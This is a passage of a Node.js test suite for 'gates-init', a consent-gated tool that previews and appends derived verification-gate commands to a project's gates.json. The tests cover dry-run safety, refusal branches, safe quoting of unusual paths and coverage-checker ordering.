  it('dry-run leaves an existing gates.json byte-identical and prints the derived entries + the trust-chain disclosure', () => {
    mkProject({ scripts: { test: 'node --test' }, gates: { _README: 'mine', gates: [{ id: 'own', title: 'Own', cmd: 'true' }] } });
    const before = gatesRaw();
    const io = quiet();
    const code = main(['--cwd', cwd], io);
    assert.equal(code, 0);
    assert.equal(gatesRaw(), before, 'dry-run must be byte-identical');
    const text = io.out.join('\n');
    assert.ok(text.includes(NPM_EXEC('node --test')), 'the preview names the derived exec cmd');
    assert.ok(text.includes(TRUST_CHAIN_DISCLOSURE), 'the preview carries the trust-chain disclosure');
    assert.match(text, /auto-approves byte-exact declared gate commands/, 'the hook implication is stated');
    assert.match(text, /two separate yeses/, 'the two-consent boundary is stated');
    // The consent step must print a RUNNABLE apply command (this tool has no bin and no mode token).
    assert.match(text, /node "[^"]*gates-init\.mjs" --cwd "[^"]*" --apply/, 'the apply hint is the real invocation');
    assert.doesNotMatch(text, /(^|\s)gates-init --apply/, 'never a bare non-runnable gates-init command');
  });

  it('a dry-run with --only prints an apply hint carrying EXACTLY those --only flags (the hint never widens the previewed consent)', () => {
    mkProject({ scripts: { test: 'node --test', lint: 'eslint .' } });
    const io = quiet();
    assert.equal(main(['--cwd', cwd, '--only', 'test'], io), 0);
    const text = io.out.join('\n');
    assert.match(text, /--apply --only test(\s|$)/, 'the hint carries the previewed subset');
    assert.doesNotMatch(text, /--only lint/, 'nothing outside the previewed subset');
    assert.doesNotMatch(text, /\[--only <id>\]/, 'no generic placeholder when the subset is explicit');
  });

  it('a cwd with double-quote-unsafe metacharacters gets a SAFE generic apply hint, never a broken quoted command', () => {
    const evil = mkdtempSync(join(tmpdir(), 'gates-init-$evil-'));
    try {
      mkdirSync(join(evil, 'docs', 'ai'), { recursive: true });
      writeFileSync(join(evil, 'docs', 'ai', '.workflow-version'), '3.0.0\n');
      writeFileSync(join(evil, 'package.json'), JSON.stringify({ scripts: { test: 'node --test' } }));
      const io = quiet();
      assert.equal(main(['--cwd', evil, '--dry-run'], io), 0);
      const text = io.out.join('\n');
      assert.match(text, /re-run this same command with --apply/, 'the fallback hint is generic and safe');
      assert.ok(!/node "[^"]*\$[^"]*"/.test(text), 'no double-quoted $-carrying path is ever printed as a command');
    } finally {
      rmSync(evil, { recursive: true, force: true });
    }
  });

  it('docs/ai presence is required on EVERY run — a dry-run outside a deployment is a STOP', () => {
    writeFileSync(join(cwd, 'package.json'), JSON.stringify({ scripts: { test: 'node --test' } }));
    const io = quiet();
    const code = main(['--cwd', cwd], io);
    assert.equal(code, 1, 'no docs/ai → precondition STOP even on dry-run');
    assert.match(io.out.join('\n'), /docs\/ai/, 'the STOP names the missing deployment');
  });
});

// ── apply behavior (append-only, consented subset, atomic discipline) ─────────────────

describe('gates-init — --apply appends exactly the consented entries', () => {
  it('appends the --only subset after the existing entries; existing entries stay unmodified; result validates', () => {
    const own = { id: 'own', title: 'Own', cmd: 'true' };
    mkProject({ scripts: { test: 'node --test', lint: 'eslint .', build: 'vite build' }, gates: { _README: 'mine', gates: [own] } });
    const io = quiet();
    const code = main(['--cwd', cwd, '--apply', '--only', 'test', '--only', 'lint'], io);
    assert.equal(code, 0, io.out.join('\n'));
    const { gates } = loadDeclaration(cwd);
    assert.deepEqual(gates[0], own, 'the existing entry is preserved verbatim, first');
    assert.deepEqual(gates.map((g) => g.id), ['own', 'test', 'lint'], 'exactly the consented subset appended, in offer order');
    assert.equal(JSON.parse(gatesRaw())._README, 'mine', 'the authored _README is preserved');
    assert.deepEqual(readdirSync(join(cwd, 'docs', 'ai')).filter((f) => f.endsWith('.tmp')), [], 'no leftover tmp');
  });

  it('a missing gates.json is seeded from the kit template (_README present) + the consented entries', () => {
    mkProject({ scripts: { test: 'node --test' } });
    const io = quiet();
    const code = main(['--cwd', cwd, '--apply'], io);
    assert.equal(code, 0, io.out.join('\n'));
    const parsed = JSON.parse(gatesRaw());
    assert.equal(typeof parsed._README, 'string', 'the seeded file carries the template _README');
    assert.deepEqual(loadDeclaration(cwd).gates.map((g) => g.id), ['test']);
  });

  it('an id collision is REFUSED loudly; the file stays byte-identical', () => {
    mkProject({ scripts: { test: 'node --test' }, gates: { gates: [{ id: 'test', title: 'Mine', cmd: 'true' }] } });
    const before = gatesRaw();
    const io = quiet();
    const code = main(['--cwd', cwd, '--apply'], io);
    assert.equal(code, 1, 'a collision is a precondition failure');
    assert.match(io.out.join('\n'), /collision|already declared/i);
    assert.equal(gatesRaw(), before, 'the declaration is untouched on refusal');
  });

  it('a MALFORMED existing declaration is a STOP — never written over', () => {
    mkProject({ scripts: { test: 'node --test' }, gates: '{ not json' });
    const before = gatesRaw();
    const io = quiet();
    assert.equal(main(['--cwd', cwd, '--apply'], io), 1);
    assert.equal(gatesRaw(), before);
  });

  it('the stamp gate holds on --apply ONLY: a missing/foreign stamp blocks apply but not the preview', () => {
    mkProject({ scripts: { test: 'node --test' }, stamp: '9.9.9' });
    const io = quiet();
    assert.equal(main(['--cwd', cwd], io), 0, 'preview works on any deployment');
    assert.equal(main(['--cwd', cwd, '--apply'], quiet()), 1, 'apply is deployment-stamp-gated');
  });

  it('a SYMLINKED gates.json leaf is a STOP — the link target is untouched (the atomic-core discipline)', () => {
    mkProject({ scripts: { test: 'node --test' } });
    const target = join(cwd, 'elsewhere.json');
    writeFileSync(target, 'SECRET');
    symlinkSync(target, join(cwd, GATES_REL));
    const io = quiet();
    assert.equal(main(['--cwd', cwd, '--apply'], io), 1);
    assert.match(io.out.join('\n'), /symlink/);
    assert.equal(readFileSync(target, 'utf8'), 'SECRET');
  });

  it('--only with an unknown id is a usage error (exit 2), nothing written', () => {
    mkProject({ scripts: { test: 'node --test' }, gates: { gates: [] } });
    const before = gatesRaw();
    assert.equal(main(['--cwd', cwd, '--apply', '--only', 'nope'], quiet()), 2);
    assert.equal(gatesRaw(), before);
  });

  it('mixed --dry-run --apply is a usage error (exit 2) — a consent-gated writer never lets the later flag win silently', () => {
    mkProject({ scripts: { test: 'node --test' } });
    const io = quiet();
    assert.equal(main(['--cwd', cwd, '--dry-run', '--apply'], io), 2);
    assert.equal(main(['--cwd', cwd, '--apply', '--dry-run'], quiet()), 2, 'order must not matter');
    assert.match(io.out.join('\n'), /--dry-run.*--apply|--apply.*--dry-run/, 'the error names the conflict');
    assert.equal(readdirSync(join(cwd, 'docs', 'ai')).includes('gates.json'), false, 'nothing written on the conflict');
  });

  it('--only typos are loud in BOTH paths: dry-run rejects too, and an empty offer never masks the typo', () => {
    mkProject({ scripts: { test: 'node --test' } });
    const dry = quiet();
    assert.equal(main(['--cwd', cwd, '--only', 'nope'], dry), 2, 'a dry-run --only typo is a usage error, never a silent filter');
    assert.match(dry.out.join('\n'), /nope/, 'the error names the unknown id');
    assert.match(dry.out.join('\n'), /offered/i, 'the error lists what IS offered');
    // An empty offer + a --only typo must fail as usage, not return the silent "nothing to offer".
    mkdirSync(join(cwd, 'empty', 'docs', 'ai'), { recursive: true });
    writeFileSync(join(cwd, 'empty', 'docs', 'ai', '.workflow-version'), '3.0.0\n');
    writeFileSync(join(cwd, 'empty', 'package.json'), JSON.stringify({ scripts: { dev: 'x' } }));
    const io = quiet();
    assert.equal(main(['--cwd', join(cwd, 'empty'), '--apply', '--only', 'test'], io), 2);
    assert.doesNotMatch(io.out.join('\n'), /nothing to offer/, 'the typo is not masked by the empty-offer success');
  });

  it('zero derived entries → a plain nothing-to-offer report, exit 0, no write', () => {
    mkProject({ scripts: { dev: 'x', start: 'x' } });
    const io = quiet();
    assert.equal(main(['--cwd', cwd, '--apply'], io), 0);
    assert.match(io.out.join('\n'), /nothing to offer|no seedable/i);
    assert.equal(readdirSync(join(cwd, 'docs', 'ai')).includes('gates.json'), false, 'no file scattered');
  });
});

// ── structural invariants ─────────────────────────────────────────────────────────────

describe('gates-init — import direction + tier absence (structural)', () => {
  it('run-gates.mjs (the runner) never imports the fill preview — the preview imports the validator, not the reverse', () => {
    const src = readFileSync(join(HERE, 'run-gates.mjs'), 'utf8');
    assert.ok(!/from\s+['"][^'"]*gates-init/.test(src), 'run-gates.mjs must not import gates-init (the runner WRITES NOTHING)');
  });

  it('procedures.mjs (read-only advisor) never imports the fill preview nor the atomic-write core', () => {
    const src = readFileSync(join(HERE, 'procedures.mjs'), 'utf8');
    for (const mod of ['gates-init', 'atomic-write']) {
      assert.ok(
        !new RegExp(`from\\s+['"][^'"]*${mod}`).test(src) && !new RegExp(`import\\(\\s*['"][^'"]*${mod}`).test(src),
        `procedures.mjs must not import ${mod} (read-only invariant)`,
      );
    }
  });

  it('the fill preview is OUTSIDE every velocity tier — a consent-per-run writer is never pre-approved', () => {
    for (const rel of KIT_WRITER_PREVIEW_TOOLS) {
      assert.ok(!rel.includes('gates-init'), `gates-init must not be in KIT_WRITER_PREVIEW_TOOLS (found ${rel})`);
    }
    for (const entry of UNIVERSAL_READONLY_ALLOWLIST) {
      assert.ok(!String(entry).includes('gates-init'), `gates-init must not appear in the core allowlist (${entry})`);
    }
  });

  it('the offer composes script entries + the conditional core-pair candidates (buildOffer)', () => {
    mkProject({ scripts: { test: 'node --test' }, config: { 'plan-execution': { review: 'council' } } });
    const offer = buildOffer(cwd);
    assert.deepEqual(offer.entries.map((e) => e.id), ['test', 'review-state', 'coverage-check']);
    const preview = formatPreview(offer);
    assert.ok(preview.includes(TRUST_CHAIN_DISCLOSURE));
  });
});

// ── refusal / degradation branches ────────────────────────────────────────────────────

describe('gates-init — refusal and degradation branches', () => {
  it('--help prints the usage and exits 0; an unknown argument is a loud usage error', () => {
    const io = quiet();
    assert.equal(main(['--help'], io), 0);
    assert.match(io.out.join('\n'), /gates-init/);
    const io2 = quiet();
    assert.equal(main(['--bogus'], io2), 2);
    assert.match(io2.out.join('\n'), /unknown argument/);
  });

  it('NO package.json at all: an honest empty offer, never a crash', () => {
    mkdirSync(join(cwd, 'docs', 'ai'), { recursive: true });
    writeFileSync(join(cwd, 'docs', 'ai', '.workflow-version'), '3.0.0\n');
    const io = quiet();
    assert.equal(main(['--cwd', cwd], io), 0);
    assert.match(io.out.join('\n'), /nothing to offer/);
  });

  it('a MALFORMED orchestration.json degrades the coverage-check candidate to a stated note', () => {
    mkProject({ scripts: { test: 'node --test' } });
    writeFileSync(join(cwd, 'docs', 'ai', 'orchestration.json'), '{ not json');
    const io = quiet();
    assert.equal(main(['--cwd', cwd], io), 0);
    assert.match(io.out.join('\n'), /coverage-check candidate was not evaluated/);
  });

  it('a parseable-but-INVALID existing declaration is a loud apply STOP (never written over)', () => {
    mkProject({ scripts: { test: 'node --test' }, gates: { gates: [{ id: 42 }] } });
    const io = quiet();
    assert.equal(main(['--cwd', cwd, '--apply'], io), 1);
    assert.match(io.out.join('\n'), /fix it by hand/);
  });

  it('an unreadable bundled template is a loud apply STOP naming the broken install', () => {
    mkProject({ scripts: { test: 'node --test' } });
    const io = quiet();
    const code = main(['--cwd', cwd, '--apply'], { ...io, readTemplate: () => { throw new Error('injected'); } });
    assert.equal(code, 1);
    assert.match(io.out.join('\n'), /kit install is incomplete/);
  });

  it('a MISSING deployment stamp gates --apply (the preview stays available)', () => {
    mkProject({ scripts: { test: 'node --test' }, stamp: null });
    const io = quiet();
    assert.equal(main(['--cwd', cwd, '--apply'], io), 1);
    assert.match(io.out.join('\n'), /absent/);
    const io2 = quiet();
    assert.equal(main(['--cwd', cwd], io2), 0, 'the preview works on any deployment');
  });
});

// ── Phase 2 (flow Plan 3): the flow-check candidate + the checker TRIO under a flow block (P21) ──
import { flowCheckCandidate } from './gates-init.mjs';

describe('gates-init — the checker TRIO under a flow block (P21)', () => {
  it('a flow block + a SOLO recipe offers the full TRIO — the internal-only arm runs INSIDE review-state, so flow-check alone would arm half the surface', () => {
    mkProject({ scripts: { test: 'node --test' }, config: { 'plan-execution': { review: 'solo' }, flow: { schema: 1 } } });
    const offer = buildOffer(cwd);
    assert.deepEqual(offer.entries.map((e) => e.id), ['test', 'review-state', 'flow-check', 'coverage-check']);
  });

  it('a flow block + council offers the TRIO with coverage-check declared LAST', () => {
    mkProject({ scripts: { test: 'node --test' }, config: { 'plan-execution': { review: 'council' }, flow: { schema: 1 } } });
    const offer = buildOffer(cwd);
    assert.deepEqual(offer.entries.map((e) => e.id), ['test', 'review-state', 'flow-check', 'coverage-check']);
    assert.equal(offer.entries[offer.entries.length - 1].id, 'coverage-check');
  });

  it('no flow block: the candidate set stays the existing pair — flow-check never appears', () => {
    mkProject({ scripts: { test: 'node --test' }, config: { 'plan-execution': { review: 'council' } } });
    const offer = buildOffer(cwd);
    assert.deepEqual(offer.entries.map((e) => e.id), ['test', 'review-state', 'coverage-check']);
  });

  it('a DQ-unsafe flow-check tool path is WITHHELD with a loud note, never offered wrongly', () => {
    mkProject({ config: { 'plan-execution': { review: 'council' }, flow: { schema: 1 } } });
    const r = flowCheckCandidate(cwd, { flowCheckTool: '/tmp/has"quote/flow-check.mjs' });
    assert.equal(r.candidate, null);
    assert.match(r.note, /withheld/);
  });
});

// ── Phase 1.2: the producer is wired for the ONE self-contained suite body ────────────
import { findUnmetProducerRefs } from './run-gates.mjs';
import { coverageDeclarationDefects } from './gates-declaration.mjs';

const COUNCIL = { 'plan-execution': { review: 'council' } };

describe('gates-init — the offered suite entry PRODUCES the lcov the checker reads', () => {
  it('a node --test offer entry is a producer; every other allowlist suite body is emitted unchanged and is not', () => {
    mkProject({ scripts: { test: 'node --test', 'test:vitest': 'vitest run', 'test:jest': 'jest', lint: 'eslint .' } });
    const entries = deriveScriptEntries(cwd);
    const cmdOf = (id) => entries.find((e) => e.id === id).cmd;
    assert.equal(matchesCoverageProducer(cmdOf('test')), true, 'the node --test entry carries the reporters');
    assert.equal(cmdOf('test-vitest'), NPM_EXEC('vitest run'), 'a vitest body is emitted verbatim (no speculative coverage flags)');
    assert.equal(matchesCoverageProducer(cmdOf('test-vitest')), false);
    assert.equal(matchesCoverageProducer(cmdOf('test-jest')), false);
    assert.equal(matchesCoverageProducer(cmdOf('lint')), false);
  });

  it('the offered producer cmd survives the unmet-producer preflight on a PLAIN run and on --final', () => {
    mkProject({ scripts: { test: 'node --test' } });
    const gates = deriveScriptEntries(cwd);
    assert.deepEqual(findUnmetProducerRefs(gates, ['AW_GIT_DIR']), [], 'a plain in-git-tree run injects everything the cmd references');
    assert.deepEqual(findUnmetProducerRefs(gates, ['AW_GIT_DIR', 'AW_LCOV_FILE']), [], '--final injects it too');
    assert.deepEqual(
      findUnmetProducerRefs(gates, []).map((u) => u.name),
      ['AW_GIT_DIR'],
      'the preflight is live: outside a git tree the same cmd is refused up front, naming the variable',
    );
  });

  it('the offered entry title names the added reporters — the offer never understates what it declares', () => {
    mkProject({ scripts: { test: 'node --test' } });
    assert.match(deriveScriptEntries(cwd)[0].title, /lcov/i);
  });
});

// ── Phase 1.3: no checker without a producer — withheld in the offer, refused at write time ──

describe('gates-init — the source-size candidate renders under one safety rule', () => {
  const SS_AUTHORED = {
    _README: 'fixture', schema: 1, defaults: { maxLines: 400, maxLineBytes: 1000 },
    roots: ['src'], exclude: [], extensions: ['.mjs'],
  };
  const withPractice = (config) => {
    mkProject({ scripts: {}, config: COUNCIL });
    writeFileSync(join(cwd, 'docs', 'ai', 'source-size.json'), JSON.stringify(config, null, 2));
  };

  it('the unminted recovery is a RUNNABLE command — resolved absolute path, the verb, its reason and an explicit --cwd', () => {
    // The note is the reader's next keystroke. A bare tool name with no node, no path and no --cwd
    // is not a command they can run; naming a step they cannot take is the same as naming none.
    withPractice(SS_AUTHORED);
    const { note } = sourceSizeCandidate(cwd);
    assert.match(note, /node "\/[^"]*source-size-check\.mjs" --adopt --reason "initial adoption" --cwd "/, `runnable as printed: ${note}`);
  });

  it('a path that is DQ-safe but LINE-unsafe still withholds — one predicate, not two half-guards', () => {
    // U+2028 survives double-quoting and still breaks a line, so a guard that only screens shell
    // metacharacters lets it through into a declared gate cmd. Both halves are the same question.
    withPractice({ ...SS_AUTHORED, baseline: {}, aggregate: {} });
    const { candidate, note } = sourceSizeCandidate(cwd, { sourceSizeTool: '/kit/we ird/tools/source-size-check.mjs' });
    assert.equal(candidate, null, 'a cmd carrying a line separator must never reach a declaration');
    assert.equal(note.includes(' '), false, `and the note itself stays one line: ${JSON.stringify(note)}`);
  });

  it('an unrenderable path still tells the truth about the STATE — hand-declaring is advice only a MINTED record can take', () => {
    // The two withholds answer different questions and the reader can only act on one of them. Over
    // an unminted record a hand-declared gate is red on every run, so "declare it by hand" is not a
    // recovery there — it is the next failure, offered as the way out.
    withPractice(SS_AUTHORED);
    const unminted = sourceSizeCandidate(cwd, { sourceSizeTool: '/kit/we"ird/tools/source-size-check.mjs' });
    assert.equal(unminted.candidate, null);
    // ORDER is the assertion, not presence: hand-declaring is a legitimate SECOND step here, and a
    // FIRST one only over a minted record. What must never happen is the reader being sent to it
    // with nothing recorded yet.
    assert.match(unminted.note, /--adopt/, `an unminted record has to be minted first: ${unminted.note}`);
    assert.ok(
      unminted.note.indexOf('--adopt') < unminted.note.indexOf('declare the gate by hand'),
      `minting has to come first: ${unminted.note}`,
    );

    withPractice({ ...SS_AUTHORED, baseline: {}, aggregate: {} });
    const minted = sourceSizeCandidate(cwd, { sourceSizeTool: '/kit/we"ird/tools/source-size-check.mjs' });
    assert.equal(minted.candidate, null);
    assert.match(minted.note, /declare the gate by hand/, `over a minted record it is exactly the right advice: ${minted.note}`);
  });

  it('a MALFORMED practice config is a stated note, never a silent absence — and the offer carries it', () => {
    // The D-5 loud contract, from this consumer's side: a config the reader cannot parse must not
    // read as "no practice declared". Silence there would let a broken file look like a project that
    // simply never adopted, and the preview would move on without ever naming what it could not read.
    mkProject({ scripts: {}, config: COUNCIL });
    writeFileSync(join(cwd, 'docs', 'ai', 'source-size.json'), '{ not json');
    const { candidate, note } = sourceSizeCandidate(cwd);
    assert.equal(candidate, null, 'nothing is offered over a config that could not be read');
    assert.match(note, /unreadable/, note);
    assert.match(note, /not evaluated/, `it says what it did NOT do: ${note}`);
    assert.ok(buildOffer(cwd).notes.some((n) => n.includes('unreadable')), 'and the offer carries the note');
  });

  it('a declaration of nothing but the source-size gate is NOT a declared project gate', () => {
    // The source-size checker is the kit's own. Counting it as the user's project verification makes
    // the preview withhold the one sentence a bare deployment needs to read.
    mkProject({ scripts: {}, gates: { gates: [{ id: 'source-size', title: 'SS', cmd: `node "${join(HERE, 'source-size-check.mjs')}" --check` }] } });
    const notes = buildOffer(cwd).notes.join(' | ');
    assert.match(notes, /no project-verification gate/, notes);
    assert.match(notes, /none is declared either/, `the advice holds — nothing here verifies the project: ${notes}`);
  });
});

describe('gates-init — the coverage-check candidate is WITHHELD when nothing produces the lcov', () => {
  it('the vitest fixture (allowlisted body, no producer) is offered NO coverage-check and is told why by name', () => {
    mkProject({ scripts: { test: 'vitest run' }, config: COUNCIL });
    const offer = buildOffer(cwd);
    assert.deepEqual(offer.entries.map((e) => e.id), ['test', 'review-state'], 'the checker is not offered dead');
    const notes = offer.notes.join(' | ');
    assert.match(notes, /coverage-check/, 'the withheld candidate is named');
    assert.match(notes, /produce/i, 'the reason is the missing producer, not a generic skip');
  });

  it('a MARKER-carrying declared gate unlocks the checker offer too — the offer asks the ONE predicate', () => {
    // The foreign-suite case the marker exists for: nothing in the offer or the declaration matches
    // the closed cmd world, and the declaration says so itself. Without the marker this same
    // fixture is the withhold above.
    mkProject({
      scripts: { lint: 'eslint .' },
      config: COUNCIL,
      gates: { gates: [{ id: 'suite', title: 'S', cmd: 'pnpm vitest run --coverage', lcovProducer: true }] },
    });
    const offer = buildOffer(cwd);
    assert.deepEqual(offer.entries.map((e) => e.id), ['lint', 'review-state', 'coverage-check']);
    assert.ok(!offer.notes.some((n) => /withheld/.test(n)), `nothing is withheld over a declared producer: ${offer.notes.join(' | ')}`);
  });

  it('a producer already DECLARED by hand unlocks the checker offer — the rule reads the merged picture, not just the offer', () => {
    mkProject({
      scripts: { lint: 'eslint .' },
      config: COUNCIL,
      gates: { gates: [{ id: 'suite', title: 'S', cmd: `${PRODUCER_BODY} test/*.test.mjs` }] },
    });
    assert.deepEqual(buildOffer(cwd).entries.map((e) => e.id), ['lint', 'review-state', 'coverage-check']);
  });

  it('an UNREADABLE existing declaration is stated even when the offer is otherwise complete — the preview never promises a set --apply will refuse', () => {
    mkProject({ scripts: { test: 'node --test' }, config: COUNCIL, gates: '{ not json' });
    const offer = buildOffer(cwd);
    assert.ok(offer.entries.some((e) => e.id === 'coverage-check'), 'the offer itself is unaffected — the producer is present');
    const notes = offer.notes.join(' | ');
    assert.match(notes, /could not be read/, 'the unreadable declaration is named');
    assert.match(notes, /--apply will refuse/, 'and the consequence is stated');
    assert.equal(main(['--cwd', cwd, '--apply'], quiet()), 1, 'apply does refuse, exactly as the note said');
  });

  it('--apply --only coverage-check against a declaration with no producer is REFUSED and writes nothing', () => {
    mkProject({ scripts: { test: 'vitest run' }, config: COUNCIL });
    const io = quiet();
    assert.notEqual(main(['--cwd', cwd, '--apply', '--only', 'coverage-check'], io), 0);
    const text = io.out.join('\n');
    assert.match(text, /coverage-check/, 'the refusal names the id');
    assert.match(text, /produce/i, 'the refusal carries the producer reason, never a bare "unknown id"');
    assert.equal(readdirSync(join(cwd, 'docs', 'ai')).includes('gates.json'), false, 'nothing written');
  });

  // D-8 REPLACES the former ordering-refusal characterization here. That test pinned the very defect
  // the placement rule removes: consenting to a producer on a declaration ending in the checker used
  // to be refused, so the only lane left was a hand edit. It now succeeds, in the one arrangement
  // that is correct.
  it('fill-places-entry-before-trailing-checker: a consented producer lands BEFORE the checker, and the result is still final-capable', () => {
    mkProject({
      scripts: { test: 'node --test' },
      config: COUNCIL,
      gates: {
        gates: [
          { id: 'review-state', title: 'RS', cmd: `node "${join(HERE, 'review-state.mjs')}" --check` },
          { id: 'coverage-check', title: 'CC', cmd: CANONICAL_CHECKER_CMD },
        ],
      },
    });
    const io = quiet();
    assert.equal(main(['--cwd', cwd, '--apply', '--only', 'test'], io), 0, io.out.join('\n'));
    const { gates } = loadDeclaration(cwd);
    assert.deepEqual(gates.map((g) => g.id), ['review-state', 'test', 'coverage-check'], 'the producer landed before the trailing checker');
    assert.deepEqual(coverageDeclarationDefects(gates, cwd), [], 'the written declaration satisfies the coverage invariant');
    assert.equal(isFinalCapableDeclaration(gates, cwd), true, 'and --final would still accept it');
  });

  it('producer-still-precedes-checker: the placement is a MOVE of the insertion point, never of an existing entry', () => {
    const own = { id: 'own', title: 'Own', cmd: 'true' };
    mkProject({
      scripts: { test: 'node --test', lint: 'eslint .' },
      config: COUNCIL,
      gates: { gates: [own, { id: 'coverage-check', title: 'CC', cmd: CANONICAL_CHECKER_CMD }] },
    });
    const io = quiet();
    assert.equal(main(['--cwd', cwd, '--apply', '--only', 'test', '--only', 'lint'], io), 0, io.out.join('\n'));
    const { gates } = loadDeclaration(cwd);
    assert.deepEqual(gates.map((g) => g.id), ['own', 'test', 'lint', 'coverage-check']);
    assert.deepEqual(gates[0], own, 'the pre-existing entry is byte-identical and still first');
    assert.equal(coverageProducerPrecedes(gates, gates.length - 1), true, 'a producer really does run before the checker now');
  });

  it('old-declarations-final-capability-unchanged: with no trailing checker the fill still appends, in offer order', () => {
    const own = { id: 'own', title: 'Own', cmd: 'true' };
    mkProject({ scripts: { test: 'node --test', lint: 'eslint .' }, gates: { gates: [own] } });
    const io = quiet();
    assert.equal(main(['--cwd', cwd, '--apply', '--only', 'test', '--only', 'lint'], io), 0, io.out.join('\n'));
    assert.deepEqual(loadDeclaration(cwd).gates.map((g) => g.id), ['own', 'test', 'lint'], 'unchanged behaviour where no checker trails');
  });

  it('fill-result-appended-alias-preserved: the result carries `placed` AND the deprecated `appended` alias, same array', () => {
    mkProject({ scripts: { test: 'node --test' } });
    const result = applyFill({ cwd, onlyIds: ['test'] });
    assert.deepEqual(result.placed, ['test']);
    assert.deepEqual(result.appended, result.placed, 'the alias carries the same ids — removing the field would be a BREAKING change');
  });

  it('a consented CHECKER is not smuggled in front of an existing one — the duplicate is refused by name', () => {
    mkProject({
      scripts: { test: 'node --test' },
      config: COUNCIL,
      gates: { gates: [{ id: 'suite', title: 'S', cmd: PRODUCER_BODY }, { id: 'coverage-check', title: 'CC', cmd: CANONICAL_CHECKER_CMD }] },
    });
    const before = gatesRaw();
    const io = quiet();
    // The offer's own checker candidate collides on the id first; either refusal is loud and writes
    // nothing — what must never happen is a second checker landing anywhere in the file.
    assert.notEqual(main(['--cwd', cwd, '--apply'], io), 0);
    assert.equal(gatesRaw(), before, 'the declaration is untouched');
  });

  it('a SECOND canonical checker under a different id is REFUSED', () => {
    mkProject({
      scripts: {},
      config: COUNCIL,
      gates: { gates: [{ id: 'suite', title: 'S', cmd: PRODUCER_BODY }, { id: 'cov', title: 'C', cmd: CANONICAL_CHECKER_CMD }] },
    });
    const before = gatesRaw();
    const io = quiet();
    assert.equal(main(['--cwd', cwd, '--apply', '--only', 'coverage-check'], io), 1);
    assert.match(io.out.join('\n'), /canonical coverage checker/i, 'the refusal names the duplicate checker');
    assert.equal(gatesRaw(), before, 'the declaration is untouched');
  });

  it('the node --test fixture still applies the pair: producer first, coverage-check LAST (characterization)', () => {
    mkProject({ scripts: { test: 'node --test', lint: 'eslint .' }, config: COUNCIL });
    const io = quiet();
    assert.equal(main(['--cwd', cwd, '--apply'], io), 0, io.out.join('\n'));
    const { gates } = loadDeclaration(cwd);
    assert.deepEqual(gates.map((g) => g.id), ['test', 'lint', 'review-state', 'coverage-check']);
    assert.equal(matchesCoverageProducer(gates[0].cmd), true, 'the applied suite gate really produces the lcov');
    assert.deepEqual(coverageDeclarationDefects(gates, cwd), [], 'the written declaration satisfies the invariant');
  });
});

describe('gates-declaration — the written-declaration coverage invariant (the pure rule)', () => {
  const checker = (id) => ({ id, title: 'C', cmd: CANONICAL_CHECKER_CMD });
  const producer = { id: 'suite', title: 'S', cmd: PRODUCER_BODY };
  const plain = { id: 'lint', title: 'L', cmd: 'eslint .' };

  it('no checker at all is not a defect — coverage is optional', () => {
    assert.deepEqual(coverageDeclarationDefects([plain, producer], HERE), []);
  });

  it('a checker with no producer, a checker that is not last, and two checkers are each a named defect', () => {
    assert.deepEqual(coverageDeclarationDefects([plain, checker('coverage-check')], HERE).map((d) => d.kind), ['no-producer']);
    assert.deepEqual(coverageDeclarationDefects([producer, checker('coverage-check'), plain], HERE).map((d) => d.kind), ['checker-not-last']);
    assert.deepEqual(
      coverageDeclarationDefects([producer, checker('cov'), checker('coverage-check')], HERE).map((d) => d.kind),
      ['duplicate-checker'],
      'the duplicate is reported first — it is the defect the user must resolve before order or production matter',
    );
  });

  it('a NEAR-MISS producer does not satisfy the rule (the closed predicate decides, not a substring)', () => {
    const nearMiss = { id: 'suite', title: 'S', cmd: 'echo "$AW_GIT_DIR/agent-workflow-lcov.info" && node --test test/*.mjs' };
    assert.deepEqual(coverageDeclarationDefects([nearMiss, checker('coverage-check')], HERE).map((d) => d.kind), ['no-producer']);
  });

  // The lcovProducer marker reaches this rule through the ONE gate-level predicate, so the whole
  // rule — production, ORDER, the checker's inability to pair with itself — holds over it unchanged.
  it('a MARKER-paired declaration satisfies the rule, and only the literal true does', () => {
    const marked = (marker) => ({ id: 'suite', title: 'S', cmd: 'pnpm vitest run --coverage', lcovProducer: marker });
    assert.deepEqual(coverageDeclarationDefects([marked(true), checker('coverage-check')], HERE), []);
    assert.deepEqual(coverageDeclarationDefects([marked(false), checker('coverage-check')], HERE).map((d) => d.kind), ['no-producer']);
    assert.deepEqual(coverageDeclarationDefects([marked('true'), checker('coverage-check')], HERE).map((d) => d.kind), ['no-producer']);
  });

  it('a marker on the CHECKER ITSELF never self-pairs — a gate cannot produce the lcov it reads', () => {
    const selfMarked = { ...checker('coverage-check'), lcovProducer: true };
    assert.deepEqual(coverageDeclarationDefects([plain, selfMarked], HERE).map((d) => d.kind), ['no-producer']);
  });

  it('a MARKED producer declared AFTER the checker refuses exactly like a recognized one — ORDER is the rule', () => {
    const marked = { id: 'suite', title: 'S', cmd: 'pnpm vitest run --coverage', lcovProducer: true };
    assert.deepEqual(coverageDeclarationDefects([checker('coverage-check'), marked], HERE).map((d) => d.kind), ['checker-not-last']);
  });
});

// ── Phase 1.5: the screen-out note states its consequence ─────────────────────────────

describe('gates-init — an offer with zero project-verification gates says so', () => {
  it('the monorepo-shaped fixture (every gate-class body screened out) states the consequence in plain words', () => {
    mkProject({ scripts: { test: 'turbo run test', lint: 'turbo run lint', build: 'turbo run build' }, config: COUNCIL });
    const io = quiet();
    assert.equal(main(['--cwd', cwd], io), 0);
    const text = io.out.join('\n');
    assert.match(text, /screened out/, 'the screened bodies are still named');
    assert.match(text, /no project-verification gate/i, 'the consequence is stated, not left to inference');
    assert.doesNotMatch(text, /turbo run/, 'no screened-out command body is echoed back');
  });

  it('a normal fixture with a real suite gate carries no such statement', () => {
    mkProject({ scripts: { test: 'node --test' }, config: COUNCIL });
    const io = quiet();
    assert.equal(main(['--cwd', cwd], io), 0);
    assert.doesNotMatch(io.out.join('\n'), /no project-verification gate/i);
  });

  it('an UNREADABLE declaration is a THIRD state — never counted as "no project gate declared", and given no advice it cannot justify', () => {
    // The gates array is empty because the file could not be PARSED, not because the project
    // declared nothing; claiming the matrix proves only kit checkers would be a fresh false report.
    mkProject({ scripts: { test: 'turbo run test' }, config: COUNCIL, gates: '{ not json' });
    const io = quiet();
    assert.equal(main(['--cwd', cwd], io), 0);
    const text = io.out.join('\n');
    assert.match(text, /offer adds no project-verification gate/i, 'the offer-level fact is still stated');
    assert.match(text, /could not be read/, 'and the unreadable declaration is named separately');
    assert.doesNotMatch(text, /would prove only/, 'the matrix claim needs a READ declaration to be true');
